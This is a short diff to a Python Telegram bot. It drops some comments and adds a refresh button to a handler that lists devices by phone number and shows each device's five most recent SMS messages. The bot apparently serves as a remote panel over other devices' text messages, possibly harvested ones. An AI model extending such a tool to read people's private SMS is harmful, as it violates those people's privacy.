@@ -615,16 +615,12 @@ async def cb_view_active_sms(callback: types.CallbackQuery):
             await callback.answer()
             return
 
-        # Build inline keyboard buttons for each active unregistered device
         keyboard_buttons = []
         for dev in active_devices:
             btn_text = f"📱 {dev['phone']} (DB: {dev['db_short']})"
-            # Callback data format: sms_<db_short>_<cid>
-            # To avoid length limits, we store mapping or encode safely
             callback_data_str = f"sms_{dev['db_short']}_{dev['cid'][:15]}"
             keyboard_buttons.append([InlineKeyboardButton(text=btn_text, callback_data=callback_data_str)])
 
-        # Keep temporary reference in memory for button lookup
         USER_DATA["temp_active_devices"] = {f"sms_{dev['db_short']}_{dev['cid'][:15]}": dev for dev in active_devices}
 
         markup = InlineKeyboardMarkup(inline_keyboard=keyboard_buttons)
@@ -677,11 +673,13 @@ async def cb_show_device_sms(callback: types.CallbackQuery):
             f"💬 <b>Top 5 Most Recent SMS History:</b>\n{sms_block}"
         )
 
-        back_markup = InlineKeyboardMarkup(inline_keyboard=[
+        refresh_callback = callback.data
+        refresh_markup = InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔄 Refresh SMS History", callback_data=refresh_callback)],
             [InlineKeyboardButton(text="⬅️ Back to Active Devices", callback_data="view_active_sms")],
             [InlineKeyboardButton(text="🏠 Main Menu", callback_data="back_to_main")]
         ])
-        await callback.message.edit_text(detail_text, parse_mode="HTML", reply_markup=back_markup)
+        await callback.message.edit_text(detail_text, parse_mode="HTML", reply_markup=refresh_markup)
     except Exception as e:
         await callback.message.edit_text(f"❌ Error fetching SMS history: {html.escape(str(e))}", reply_markup=get_main_menu())
 
